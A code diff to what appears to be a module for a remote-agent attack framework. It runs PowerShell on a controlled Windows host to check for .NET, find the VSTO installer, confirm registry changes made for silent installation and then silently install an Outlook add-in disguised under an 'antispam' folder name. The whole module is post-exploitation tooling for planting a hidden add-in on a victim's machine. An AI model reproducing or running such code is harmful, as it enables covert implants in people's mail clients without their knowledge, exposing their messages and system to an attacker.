@@ -25,7 +25,6 @@ def run(API, agent_name):
     if(" 4." not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
         raise ValueError('No .NET 4 Client Profile, cannot proceed')
     
-    
     # Get VSTO installer path
     opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\Microsoft\\VSTO Runtime Setup' | 
                          Get-ItemProperty | Select InstallerPath"""
@@ -48,14 +47,11 @@ def run(API, agent_name):
     results = API.agent_run_shell_cmd_with_result(agent_name, opts)
     if("PSPath" not in results):
         raise ValueError('Fail to add VSTO registry for silent install')
-    #base64encodedcontent = "bG9sIHRoaXMgaXMgYSBsb2wgdGVzdA=="
-    #upload_opts = {"filename": uploadpath + "\\test.txt", "data":base64encodedcontent }
-    #API.agent_upload(agent_name, upload_opts)
 
-    # todo2 upload VSTO zip file LOCALAPPDATA 
+    # todo2 download VSTO zip file to LOCALAPPDATA 
     # todo3 unzip VSTO file
 
-    # todo4 VSTOinstaller silent install
+    # VSTOinstaller silent install
     opts['command'] = '& "' + VSTOinstallerpath + '" /s /i "' + uploadpath + '\\antispam\\OutlookAddIn1.vsto"'
     API.agent_run_shell_cmd_with_result(agent_name, opts)
     return results
